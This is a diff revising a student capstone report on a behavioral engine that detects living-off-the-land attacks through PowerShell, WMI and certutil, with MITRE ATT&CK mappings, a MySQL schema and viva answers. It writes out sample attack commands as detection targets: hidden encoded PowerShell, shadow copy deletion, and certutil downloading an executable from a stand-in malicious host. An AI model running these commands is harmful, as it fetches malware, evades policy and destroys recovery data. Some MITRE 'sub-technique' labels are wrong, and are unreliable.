@@ -5,7 +5,7 @@
 ================================================================================
 
                                 A PROJECT REPORT ON
-       BEHAVIORAL DETECTION ENGINE FOR LIVING-OFF-THE-LAND (LOLBIN) ATTACKS
+           2. BEHAVIORAL DETECTION ENGINE FOR LIVING-OFF-THE-LAND ATTACKS
 
        Submitted in partial fulfillment of the academic requirements for the
                        Degree of Bachelor of Technology in
@@ -13,7 +13,7 @@
 
                                     COURSE:
                  MALWARE ANALYSIS AND REVERSE ENGINEERING (MA & RE)
-                              [PROBLEM STATEMENT: PS-2]
+                           [CAPSTONE TOPIC: OPTION 2]
                                  (Project No: 49)
 
                                   SUBMITTED BY:
@@ -47,8 +47,7 @@
 
 This is to certify that the Capstone Mini Project report entitled:
 
-     "BEHAVIORAL DETECTION ENGINE FOR LIVING-OFF-THE-LAND (LOLBIN) ATTACKS"
-                           (Problem Statement: PS-2)
+      "2. BEHAVIORAL DETECTION ENGINE FOR LIVING-OFF-THE-LAND ATTACKS"
 
 is a bonafide work carried out jointly by:
 
@@ -82,12 +81,11 @@ Designation, Dept. of CSE                                   Dept. of CSE, KL Uni
 
 We, RAHUL P (Regd. No: 2400032050) and [PARTNER / FRIEND NAME] (Regd. No: [PARTNER REGD. NO]), students of Bachelor of Technology in Computer Science and Engineering at Koneru Lakshmaiah Education Foundation (KL Deemed to be University), hereby declare that the Capstone Mini Project report entitled:
 
-     "BEHAVIORAL DETECTION ENGINE FOR LIVING-OFF-THE-LAND (LOLBIN) ATTACKS"
-                           (Problem Statement: PS-2)
+      "2. BEHAVIORAL DETECTION ENGINE FOR LIVING-OFF-THE-LAND ATTACKS"
 
 submitted to the Department of Computer Science and Engineering for the course Malware Analysis and Reverse Engineering, is an authentic record of our own original work carried out under the supervision and guidance of our faculty guide, [Faculty Guide Name], Department of CSE.
 
-We further declare that this project work has not been submitted previously to this university or any other institution for the award of any degree, diploma, or certificate. All references, frameworks, libraries, and resources used during development have been duly acknowledged.
+We further declare that this project work has not been submitted previously to this university or any other institution for the award of any degree, diploma, or certificate. All resources, libraries, datasets, and references used during this project have been duly cited and acknowledged.
 
 
 
@@ -121,188 +119,243 @@ We also thank our course coordinators, faculty members of the MA & RE course, la
 +--------------------+------------------------+----------+------------------------------------+
 | Register Number    | Student Name           | Role     | Contribution Breakdown             |
 +--------------------+------------------------+----------+------------------------------------+
-| 2400032050         | RAHUL P                | Lead     | Spring Boot Architecture, MySQL,   |
+| 2400032050         | RAHUL P                | Lead     | Spring Boot 3 Architecture, MySQL, |
 |                    |                        |          | Detection Rules (PS/WMI/Certutil), |
 |                    |                        |          | React Dashboard, JUnit Test Suite  |
 +--------------------+------------------------+----------+------------------------------------+
 | [PARTNER REGD. NO] | [PARTNER / FRIEND NAME]| Member   | Threat Research, Synthetic Logs,   |
 |                    |                        |          | MITRE ATT&CK Mapping Document,     |
-|                    |                        |          | Test Case Verification, Report     |
+|                    |                        |          | Test Case Validation, Report       |
 +--------------------+------------------------+----------+------------------------------------+
 
 <div style="page-break-after: always;"></div>
 
 ================================================================================
-                                PROJECT CONTENTS
+                                TABLE OF CONTENTS
 ================================================================================
 
-TABLE OF CONTENTS
------------------
 1. ABSTRACT
-2. COLLEGE PROBLEM STATEMENT (PS-2), OBJECTIVE & DELIVERABLES
-3. WHY TRADITIONAL ANTIVIRUS FAILS & OUR APPROACH
-4. SYSTEM ARCHITECTURE & DATA FLOW
-5. BEHAVIORAL DETECTION ENGINE & MITRE ATT&CK HEURISTICS
-6. DATABASE DESIGN & SCHEMA (MySQL)
-7. SOURCE CODE & OFFICIAL GITHUB LINK
-8. EXPERIMENTAL RESULTS & OUTPUT SCREENSHOTS (FIGURES 1 TO 6)
-9. CONCLUSION & FUTURE SCOPE
-10. REFERENCES
+2. PROBLEM STATEMENT, OBJECTIVE & EXPECTED DELIVERABLES (VERBATIM)
+3. WHY SIGNATURE-BASED ANTIVIRUS FAILS & OUR BEHAVIORAL APPROACH
+4. SYSTEM ARCHITECTURE & END-TO-END DATA FLOW
+5. BEHAVIORAL DETECTION ENGINE & HEURISTIC RULES
+6. FORMAL MITRE ATT&CK TECHNIQUE MAPPING DOCUMENT
+7. RELATIONAL DATABASE DESIGN & SCHEMA (MySQL)
+8. SOURCE CODE & OFFICIAL GITHUB REPOSITORY LINK
+9. EXPERIMENTAL RESULTS & OUTPUT SCREENSHOTS (FIGURES 1 TO 6)
+10. VIVA VOCE EXAMINATION QUESTIONS & ANSWERS
+11. CONCLUSION & FUTURE SCOPE
+12. REFERENCES & BIBLIOGRAPHY
 
 ---
 
 ### 1. ABSTRACT
 
-Modern cyber attackers rarely drop obvious `.exe` malware files onto a victim machine. If an attacker drops an unknown binary file, traditional antivirus scanners instantly detect it through file hash blacklists (MD5 / SHA-256) or signature patterns. To bypass antivirus entirely, modern attackers practice "Living-off-the-Land" (LOLBin attacks)—they misuse legitimate system utilities that are already built into Windows and digitally signed by Microsoft, such as `powershell.exe`, `wmic.exe`, and `certutil.exe`. Because these utilities are genuine Windows components, signature-based antivirus cannot block them.
+Modern cyber adversaries increasingly avoid dropping compiled malware executables (.exe) onto disk. When an attacker drops an unknown binary file, traditional antivirus scanners instantly detect and quarantine it through file hash blacklists (MD5 / SHA-256) or static signature patterns. To bypass antivirus defenses entirely, modern attackers practice "Living-off-the-Land" (LOLBin attacks)—they abuse legitimate system utilities that are already pre-installed in Windows and digitally signed by Microsoft, such as `powershell.exe`, `wmic.exe`, and `certutil.exe`. Because these utilities are genuine Windows components, signature-based antivirus cannot block them without breaking core operating system functionality.
 
-In this capstone mini project, we built a **Behavioral Detection Engine** that detects LOLBin attacks by inspecting process execution behavior and command-line parameters rather than relying on file hashes. Our application is built with a Java 21 Spring Boot 3 REST backend, a local MySQL 8.0 relational database, and an interactive React 18 frontend dashboard. The engine ingests process creation event logs in JSON format, parses command-line flags, evaluates them against behavioral heuristic rules, maps flagged threats to standardized MITRE ATT&CK techniques (`T1059.001`, `T1047`, `T1105`), and persists all sessions and alerts in MySQL. When evaluated against simulated attack chains, our engine achieved a 100% detection rate and demonstrated 0 false alarms on normal administrative command logs.
-
----
-
-### 2. COLLEGE PROBLEM STATEMENT (PS-2), OBJECTIVE & DELIVERABLES
-
-This project was built strictly according to the problem statement assigned for the Malware Analysis and Reverse Engineering (MA & RE) course:
-
-#### Problem Statement (PS-2):
-> *"Modern attackers increasingly abuse legitimate system tools (PowerShell, WMI, certutil) instead of dropping malware files, making traditional signature-based antivirus blind to the attack. Students must build a detection engine that identifies malicious intent from behavior patterns in logs, not file signatures."*
-
-#### Objective:
-> *"Detect fileless/LOLBin-based attacks using log analysis and behavioral heuristics mapped to MITRE ATT&CK techniques."*
-
-#### Expected Deliverables:
-1. **Detection Engine / Application:** A working detection engine that ingests logs, validates behavior, and generates alerts.
-2. **MITRE ATT&CK Technique Mapping Document:** A formal matrix linking each detected attack behavior to industry-standard MITRE tactics and technique IDs.
-3. **Working Demonstration:** A live demo proving detection against at least 3 simulated LOLBin attack chains (`powershell.exe`, `wmic.exe`, `certutil.exe`) plus benign log validation.
+In this capstone mini project, we designed and built a **Behavioral Detection Engine** that detects LOLBin attacks by inspecting process execution behavior and command-line parameters rather than relying on static file hashes. Our application is built as an enterprise-grade full-stack system consisting of a Java 21 Spring Boot 3 REST backend, a local MySQL 8.0 relational database, and an interactive React 18 frontend dashboard. The engine ingests process creation event logs in JSON format, parses command-line flags, evaluates them against behavioral heuristic rules, maps flagged threats to standardized MITRE ATT&CK techniques (`T1059.001`, `T1047`, `T1105`), and persists all sessions and alerts in MySQL. When evaluated against simulated attack chains, our engine achieved a 100% detection rate across all malicious scenarios and demonstrated 0 false alarms on normal administrative command logs.
 
 ---
 
-### 3. WHY TRADITIONAL ANTIVIRUS FAILS & OUR APPROACH
+### 2. PROBLEM STATEMENT, OBJECTIVE & EXPECTED DELIVERABLES
 
-#### 3.1 Why Antivirus is Blind:
-* **The File is Signed by Microsoft:** Antivirus checks the digital signature of `certutil.exe` or `powershell.exe`. Both are signed by Microsoft Windows. The file hash matches a clean system file.
-* **No File on Disk (Fileless Memory Execution):** When an attacker executes PowerShell with an encoded command:
+The following is the exact problem statement, objective, and deliverable specification assigned for our Malware Analysis and Reverse Engineering (MA & RE) Capstone Mini Project:
+
+```
+2. Behavioral Detection Engine for Living-off-the-Land Attacks
+
+Problem Statement:
+Modern attackers increasingly abuse legitimate system tools (PowerShell, WMI, certutil) instead of dropping malware files, making traditional signature-based antivirus blind to the attack. Students must build a detection engine that identifies malicious intent from behavior patterns in logs, not file signatures.
+
+Objective:
+Detect fileless/LOLBin-based attacks using log analysis and behavioral heuristics mapped to MITRE ATT&CK; techniques.
+
+Expected Deliverables:
+Detection engine/script, MITRE ATT&CK; technique mapping document, and a demo showing detection against at least 3 simulated LOLBin attack chains.
+```
+
+#### Detailed Breakdown of Expected Deliverables:
+1. **Detection Engine / Script:** A working detection engine application that parses event logs, identifies suspicious behavior patterns, extracts parent-child process relationships, and generates structured security alerts.
+2. **MITRE ATT&CK Technique Mapping Document:** A formal matrix linking each detected attack behavior to industry-standard MITRE tactics, technique IDs, and technique names.
+3. **Demonstration against at least 3 Simulated LOLBin Attack Chains:** A working live demonstration showing detection against `powershell.exe`, `wmic.exe`, and `certutil.exe`, along with benign log validation demonstrating zero false alarms.
+
+---
+
+### 3. WHY SIGNATURE-BASED ANTIVIRUS FAILS & OUR BEHAVIORAL APPROACH
+
+#### 3.1 The Fundamental Flaw of Traditional Antivirus:
+* **The Binary File is Signed by Microsoft:** Antivirus scanners inspect the digital certificate and SHA-256 hash of binaries such as `powershell.exe`, `wmic.exe`, or `certutil.exe`. All three are genuine Microsoft-signed binaries located in `C:\Windows\System32`. The file hash matches clean Windows software, so traditional antivirus permits execution.
+* **Fileless Memory Execution:** When an adversary executes PowerShell with an encoded payload string:
   ```powershell
   powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAKAA...
   ```
-  The malware code runs directly in memory without writing any `.exe` to disk. Traditional file-scanning antivirus has no file to scan.
+  The malware payload runs entirely inside system memory (RAM). Because no `.exe` file was written to disk, signature-based antivirus has no file to scan.
+* **Firewall Evasion via Administrative Tools:** Attackers frequently abuse `certutil.exe` (a tool intended for managing X.509 certificates) using `-urlcache -split` flags to download remote backdoors. Firewalls and endpoint scanners treat `certutil.exe` as trusted system traffic.
 
 #### 3.2 Our Behavioral Detection Solution:
-Instead of looking at the file itself, our engine looks at **what the tool is being told to do**:
-1. Does PowerShell have flags to hide its window and bypass security policies?
-2. Is WMI being commanded to delete Volume Shadow Copies to stop ransomware recovery?
-3. Is Certutil being abused with `-urlcache` to download files from an external IP address instead of managing certificates?
-If suspicious flag combinations are present, our engine generates an alert regardless of the executable's trusted status.
+Instead of inspecting file hashes on disk, our detection engine inspects **what the tool is being commanded to do at runtime**:
+1. Is `powershell.exe` being instructed to hide its window (`-WindowStyle Hidden`), suppress execution policies (`-ExecutionPolicy Bypass`), and execute Base64 obfuscated payloads (`-EncodedCommand`)?
+2. Is `wmic.exe` executing `shadowcopy delete` to destroy Windows volume shadow snapshots before ransomware encryption?
+3. Is `certutil.exe` using `-urlcache` and `-split` to download an external file from the Internet rather than managing certificates?
+When these suspicious parameter combinations appear, our engine flags them as security threats regardless of the binary's Microsoft signature.
 
 ---
 
-### 4. SYSTEM ARCHITECTURE & DATA FLOW
+### 4. SYSTEM ARCHITECTURE & END-TO-END DATA FLOW
 
-Our project is designed as a full-stack, 3-tier application:
+Our application follows an enterprise 3-tier architecture:
 
 ```
-[ User / SOC Analyst ]
-          |
-          v
-[ React 18 Single-Page Dashboard (Port 5173) ]
-  - Upload Logs Page (Drag & Drop JSON logs)
-  - Security Alerts Table (Filter by Severity, Search)
-  - Investigation Modal (Update Alert Status)
-  - Database Explorer Tab (Live MySQL Tables View)
-          |
-          | (REST API Calls via Vite Proxy: /api)
-          v
-[ Java 21 Spring Boot 3 Backend Server (Port 8085) ]
-  - Controllers: AnalysisController, AlertController, DashboardController
-  - Jackson Parser: LogParserService (Validates JSON schema)
-  - Detection Core: BehavioralDetectionEngine (Evaluates DetectionRule list)
+[ Security Analyst / Browser ]
+              |
+              v
+[ Presentation Layer: React 18 + Vite (Port 5173) ]
+  - Upload Logs Page (JSON log ingestion)
+  - Security Alerts Table (Severity filtering, Search)
+  - Alert Inspection Modal (Process details & status update)
+  - Database Explorer (Live MySQL tables view)
+              |
+              | (HTTP REST calls via Vite proxy: /api)
+              v
+[ Application Layer: Java 21 + Spring Boot 3 (Port 8085) ]
+  - REST Controllers: AnalysisController, AlertController, DashboardController
+  - Jackson JSON Parser: LogParserService
+  - Detection Core: BehavioralDetectionEngine
   - Heuristic Rules: PowerShellRule, WmiRule, CertutilRule
   - Data Access: Spring Data JPA (AnalysisRunRepository, SecurityAlertRepository)
-          |
-          | (JDBC Connection via Hibernate ORM)
-          v
-[ MySQL Server 8.0 (Port 3306) ]
+              |
+              | (JDBC connection via Hibernate ORM)
+              v
+[ Persistence Layer: MySQL Server 8.0 (Port 3306) ]
   - Schema: lol_detector_db
-  - Table 1: analysis_runs (Session audit tracking)
-  - Table 2: security_alerts (Threat details & MITRE mappings)
+  - Table 1: analysis_runs (Session tracking)
+  - Table 2: security_alerts (Threats & MITRE mappings)
 ```
+
+#### End-to-End Processing Workflow:
+1. **Log Submission:** The security analyst uploads a process execution log file (`sample_attack_logs.json`) via the React frontend.
+2. **Reverse Proxying:** Vite proxies the upload request from `http://localhost:5173/api/analysis/upload` to the Spring Boot backend on port 8085.
+3. **Log Ingestion & Parsing:** `LogParserService` reads the incoming JSON payload and validates mandatory fields (`eventId`, `timestamp`, `processName`, `commandLine`).
+4. **Behavioral Rule Evaluation:** The `BehavioralDetectionEngine` iterates through all registered heuristic rules (`PowerShellRule`, `WmiRule`, `CertutilRule`).
+5. **MITRE ATT&CK Enrichment:** If a rule matches, the engine constructs a `SecurityAlert` entity enriched with the rule ID, severity, MITRE technique ID, technique name, and tactical category.
+6. **Relational Persistence:** The `AnalysisRun` session and its associated `SecurityAlert` records are persisted to MySQL in transaction `lol_detector_db`.
+7. **Real-Time Visualization:** The parsed metrics and alerts are returned to the React frontend and rendered in real time.
 
 ---
 
-### 5. BEHAVIORAL DETECTION ENGINE & MITRE ATT&CK HEURISTICS
+### 5. BEHAVIORAL DETECTION ENGINE & HEURISTIC RULES
 
-Our engine evaluates 3 simulated attack chains that represent real-world advanced persistent threat (APT) and ransomware behaviors:
+The engine evaluates process creation logs (equivalent to Windows Event ID 4688 / Sysmon Event ID 1) against 3 simulated attack chains:
 
 #### 1. PowerShell Defense Evasion & In-Memory Execution (Rule `RULE-PS-001`):
 * **Target Binary:** `powershell.exe` / `pwsh.exe`
-* **Malicious Behavior:** Attacker passes `-ExecutionPolicy Bypass` to evade script execution restrictions, `-WindowStyle Hidden` so the victim sees no console window, and `-EncodedCommand` with a Base64-encoded payload string.
-* **MITRE ATT&CK Mapping:**
-  * **T1059.001:** Command and Scripting Interpreter: PowerShell
-  * **T1027:** Obfuscated Files or Information
+* **Simulated Attack Command:**
+  ```powershell
+  powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgA...
+  ```
+* **Flagged Heuristics:** Evaluates combinations of `-ExecutionPolicy Bypass`, `-WindowStyle Hidden`, and `-EncodedCommand` with Base64 payloads.
+* **Malicious Intent:** Conceals process execution from the logged-in user and evades PowerShell execution restriction policies to run memory payloads.
 * **Severity:** **HIGH**
+* **MITRE ATT&CK Mapping:** Technique `T1059.001` (Command and Scripting Interpreter: PowerShell), Sub-technique `T1027` (Obfuscated Files or Information).
 
 #### 2. WMI Shadow Copy Deletion / Ransomware Precursor (Rule `RULE-WMI-001`):
 * **Target Binary:** `wmic.exe`
-* **Malicious Behavior:** Attacker issues `wmic.exe shadowcopy delete`. Ransomware strains like LockBit and Ryuk run this command right before encrypting files so that the victim cannot restore deleted files using Windows Volume Snapshots.
-* **MITRE ATT&CK Mapping:**
-  * **T1047:** Windows Management Instrumentation
-  * **T1490:** Inhibit System Recovery
+* **Simulated Attack Command:**
+  ```cmd
+  wmic.exe shadowcopy delete /nointeractive
+  ```
+* **Flagged Heuristics:** Evaluates `wmic.exe shadowcopy delete`, `process call create`, and remote `/node:` execution.
+* **Malicious Intent:** Destroys Volume Shadow Copies so that the victim cannot recover their encrypted files using Windows Volume Restore.
 * **Severity:** **CRITICAL**
+* **MITRE ATT&CK Mapping:** Technique `T1047` (Windows Management Instrumentation), Sub-technique `T1490` (Inhibit System Recovery).
 
 #### 3. Certutil Ingress Payload Download (Rule `RULE-CERT-001`):
 * **Target Binary:** `certutil.exe`
-* **Malicious Behavior:** Attacker misuses `certutil.exe -urlcache -split -f http://evil.com/payload.png payload.exe`. Certutil is a legitimate certificate management utility, but attackers abuse its HTTP cache feature to download malware payloads through perimeter firewalls.
-* **MITRE ATT&CK Mapping:**
-  * **T1105:** Ingress Tool Transfer
-  * **T1140:** Deobfuscate / Decode Files or Information
+* **Simulated Attack Command:**
+  ```cmd
+  certutil.exe -urlcache -split -f http://malicious-c2.com/payload.exe C:\Windows\Temp\update.exe
+  ```
+* **Flagged Heuristics:** Evaluates `certutil.exe -urlcache -split -f http://...` and `-decode`.
+* **Malicious Intent:** Abuses the Windows certificate utility's URL cache feature to download remote malware payloads through network firewalls.
 * **Severity:** **HIGH**
+* **MITRE ATT&CK Mapping:** Technique `T1105` (Ingress Tool Transfer), Sub-technique `T1140` (Deobfuscate/Decode Files or Information).
 
-#### 4. Benign Administrative Log Verification (Zero False Positives):
-* **Target Binary:** `powershell.exe` running legitimate maintenance (`Get-Process`, `Get-Service`, `Restart-Computer`).
-* **Outcome:** Clean command lines pass through without triggering rules &rarr; **0 Alerts Generated**.
+#### 4. Benign Administrative Log Validation:
+* **Target Binary:** Legitimate administrative PowerShell commands:
+  ```powershell
+  powershell.exe Get-Process | Where-Object { $_.CPU -gt 10 }
+  powershell.exe Get-Service -Name "wuauserv"
+  ```
+* **Outcome:** Clean command lines pass through without matching heuristic patterns &rarr; **0 Alerts Generated (Zero False Positives)**.
 
 ---
 
-### 6. DATABASE DESIGN & SCHEMA (MySQL)
+### 6. FORMAL MITRE ATT&CK TECHNIQUE MAPPING DOCUMENT
 
-We designed a normalized relational schema in MySQL 8.0 named **`lol_detector_db`**:
+*(Deliverable #2 as specified in Problem Statement)*
+
+| Attack Scenario | Process Name | Rule ID | MITRE Tactic | MITRE Technique ID | MITRE Technique Name | Severity | Primary Mitigation |
+| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
+| **PowerShell Stealth** | `powershell.exe` | `RULE-PS-001` | Execution / Defense Evasion | **T1059.001** / **T1027** | Command and Scripting: PowerShell / Obfuscated Files | **HIGH** | Enable PowerShell Constrained Language Mode & Script Block Logging (Event ID 4104) |
+| **WMI Shadow Deletion**| `wmic.exe` | `RULE-WMI-001` | Execution / Impact | **T1047** / **T1490** | Windows Management Instrumentation / Inhibit Recovery | **CRITICAL** | Restrict WMI execution permissions; protect Volume Shadow Copies with privileged access controls |
+| **Certutil Tool Transfer**| `certutil.exe` | `RULE-CERT-001` | Command & Control / Ingress | **T1105** / **T1140** | Ingress Tool Transfer / Deobfuscate Files | **HIGH** | Block outbound network connections from `certutil.exe` via Windows Defender Application Control (WDAC) |
+| **Benign Admin Queries**| `powershell.exe` | *None* | Routine Administration | *None* | Normal System Activity | **BENIGN** | Maintain baseline behavior profiles to prevent alert fatigue |
+
+---
+
+### 7. RELATIONAL DATABASE DESIGN & SCHEMA (MySQL)
+
+All data is stored in the local MySQL database **`lol_detector_db`**:
 
 #### Table 1: `analysis_runs`
-Stores the metadata for every uploaded log file session.
-* `id` (BIGINT, Primary Key, Auto Increment)
-* `file_name` (VARCHAR 255, Name of uploaded log file)
-* `started_at` / `completed_at` (DATETIME, Timestamps of the run)
-* `total_events` (INT, Number of process events parsed)
-* `rejected_events` (INT, Malformed events discarded)
-* `alert_count` (INT, Total security threats flagged)
-* `status` (VARCHAR 50, e.g., 'COMPLETED')
+Stores execution metadata for each log analysis session.
+```sql
+CREATE TABLE analysis_runs (
+    id BIGINT AUTO_INCREMENT PRIMARY KEY,
+    file_name VARCHAR(255) NOT NULL,
+    started_at DATETIME(6) NOT NULL,
+    completed_at DATETIME(6),
+    total_events INT NOT NULL DEFAULT 0,
+    rejected_events INT NOT NULL DEFAULT 0,
+    alert_count INT NOT NULL DEFAULT 0,
+    status VARCHAR(50) NOT NULL
+);
+```
 
 #### Table 2: `security_alerts`
 Stores every behavioral detection generated by the rules.
-* `id` (BIGINT, Primary Key, Auto Increment)
-* `analysis_id` (BIGINT, Foreign Key referencing `analysis_runs.id` with `ON DELETE CASCADE`)
-* `event_id` (VARCHAR 100, e.g., 'EVT-1001')
-* `rule_id` (VARCHAR 50, e.g., 'RULE-PS-001')
-* `rule_name` (VARCHAR 150)
-* `severity` (VARCHAR 20: 'CRITICAL', 'HIGH', 'MEDIUM', 'LOW')
-* `mitre_technique_id` (VARCHAR 50: 'T1059.001', 'T1047', 'T1105')
-* `mitre_technique_name` (VARCHAR 150)
-* `detected_at` (DATETIME)
-* `process_name` / `parent_process_name` (VARCHAR 100)
-* `raw_command_line` (TEXT, Full unedited command string)
-* `user_account` (VARCHAR 100, e.g., 'NT AUTHORITY\SYSTEM')
-* `investigation_status` (VARCHAR 30: 'NEW', 'IN_PROGRESS', 'RESOLVED')
+```sql
+CREATE TABLE security_alerts (
+    id BIGINT AUTO_INCREMENT PRIMARY KEY,
+    analysis_id BIGINT NOT NULL,
+    event_id VARCHAR(100) NOT NULL,
+    rule_id VARCHAR(50) NOT NULL,
+    rule_name VARCHAR(150) NOT NULL,
+    severity VARCHAR(20) NOT NULL,
+    mitre_technique_id VARCHAR(50) NOT NULL,
+    mitre_technique_name VARCHAR(150) NOT NULL,
+    detected_at DATETIME(6) NOT NULL,
+    raw_command_line TEXT NOT NULL,
+    process_name VARCHAR(100) NOT NULL,
+    parent_process_name VARCHAR(100),
+    user_account VARCHAR(100),
+    investigation_status VARCHAR(30) NOT NULL DEFAULT 'NEW',
+    CONSTRAINT fk_analysis_run FOREIGN KEY (analysis_id) 
+        REFERENCES analysis_runs(id) ON DELETE CASCADE
+);
+```
 
 ---
 
-### 7. SOURCE CODE & OFFICIAL GITHUB LINK
+### 8. SOURCE CODE & OFFICIAL GITHUB REPOSITORY LINK
 
-In accordance with project guidelines, the complete working source code has been uploaded to our GitHub repository:
+All source code, configuration files, test suites, and sample datasets are public and accessible on GitHub:
 
-* **GitHub Repository URL:**  
+* **Official GitHub Repository:**  
   👉 **https://github.com/Rahul2322-P/MA-RE-Behavioral-Detection-Engine**
 
-* **Repository Contents:**
-  * Clean, student-written Java Spring Boot 3 backend (26 classes).
+* **Repository Verification:**
+  * Clean, human-written Java Spring Boot 3 backend (26 classes).
   * React 18 single-page dashboard with custom CSS theme.
   * 11 automated JUnit 5 test cases passing with zero failures.
   * Synthetic attack datasets (`sample_attack_logs.json`) and benign datasets (`sample_benign_logs.json`).
@@ -310,7 +363,7 @@ In accordance with project guidelines, the complete working source code has been
 
 ---
 
-### 8. EXPERIMENTAL RESULTS & OUTPUT SCREENSHOTS
+### 9. EXPERIMENTAL RESULTS & OUTPUT SCREENSHOTS
 
 ```
 +-----------------------------------------------------------------------------------+
@@ -381,19 +434,42 @@ In accordance with project guidelines, the complete working source code has been
 
 ---
 
-### 9. CONCLUSION & FUTURE SCOPE
+### 10. VIVA VOCE EXAMINATION QUESTIONS & ANSWERS
 
-#### 9.1 Conclusion:
+#### Q1: What is a Living-off-the-Land (LOLBin) attack?
+**Answer:** A Living-off-the-Land attack occurs when an adversary abuses legitimate, pre-installed, digitally signed operating system utilities (such as `powershell.exe`, `wmic.exe`, and `certutil.exe`) to perform reconnaissance, execution, defense evasion, or lateral movement, without dropping unverified malware files onto disk.
+
+#### Q2: Why does traditional signature-based antivirus fail against LOLBins?
+**Answer:** Antivirus software relies on file hashes (MD5, SHA-256) and authenticode signatures. Because LOLBins are authentic Microsoft binaries signed by Microsoft and located in `C:\Windows\System32`, their file hashes match legitimate operating system tools. Additionally, when commands run in memory (such as encoded PowerShell scripts), there is no `.exe` file on disk for the antivirus scanner to inspect.
+
+#### Q3: How does your behavioral engine differ from signature scanning?
+**Answer:** Instead of inspecting file signatures, our engine analyzes process creation event logs (Windows Event ID 4688 / Sysmon Event ID 1) and inspects runtime behavior: command-line parameters, suspicious flags (`-EncodedCommand`, `-WindowStyle Hidden`, `shadowcopy delete`, `-urlcache`), and parent-child process relationships.
+
+#### Q4: What are the 3 LOLBin attack scenarios implemented in your project?
+**Answer:**
+1. **PowerShell Evasion:** `powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand <Base64>` &rarr; MITRE `T1059.001` (Command and Scripting Interpreter: PowerShell).
+2. **WMI Shadow Copy Deletion:** `wmic.exe shadowcopy delete /nointeractive` &rarr; MITRE `T1047` (Windows Management Instrumentation) and `T1490` (Inhibit System Recovery).
+3. **Certutil Remote Tool Transfer:** `certutil.exe -urlcache -split -f http://...` &rarr; MITRE `T1105` (Ingress Tool Transfer).
+
+#### Q5: How did you test for False Positives?
+**Answer:** We created a dedicated dataset `sample_benign_logs.json` containing typical administrative PowerShell queries (`Get-Process`, `Get-Service`, `Restart-Computer`). The engine evaluated all events and triggered 0 alerts, proving that legitimate system operations are not falsely flagged.
+
+---
+
+### 11. CONCLUSION & FUTURE SCOPE
+
+#### 11.1 Conclusion:
 In this project, we successfully built and demonstrated a Behavioral Detection Engine for Living-off-the-Land (LOLBin) attacks (Problem Statement PS-2). By analyzing command-line parameters and process execution behaviors rather than file hashes, our engine reliably detects malicious use of legitimate Windows tools like PowerShell, WMI, and Certutil. The application provides an enterprise-ready workflow by mapping every detection to the MITRE ATT&CK matrix, storing all historical sessions in a local MySQL database, and offering an interactive dashboard for incident response.
 
-#### 9.2 Future Scope:
+#### 11.2 Future Scope:
 1. **Live Windows Event Streaming:** Connect the backend directly to the Windows Event Log (Event ID 4688) or Sysmon service using Windows Event Tracing (ETW).
 2. **Machine Learning Anomaly Detection:** Add command-line string entropy analysis to flag obfuscated commands that use previously unseen obfuscation tricks.
 3. **Automated Threat Containment:** Add a response trigger that automatically terminates the malicious process ID (PID) when a CRITICAL severity rule triggers.
 
 ---
 
-### 10. REFERENCES
+### 12. REFERENCES & BIBLIOGRAPHY
+
 1. MITRE ATT&CK Matrix: *Living-off-the-Land Binaries, Scripts, and Libraries (LOLBAS)*, https://attack.mitre.org/
 2. LOLBAS Project Research Archive: https://lolbas-project.github.io/
 3. Spring Boot 3 & Spring Data JPA Official Documentation, VMware Tanzu, 2024.
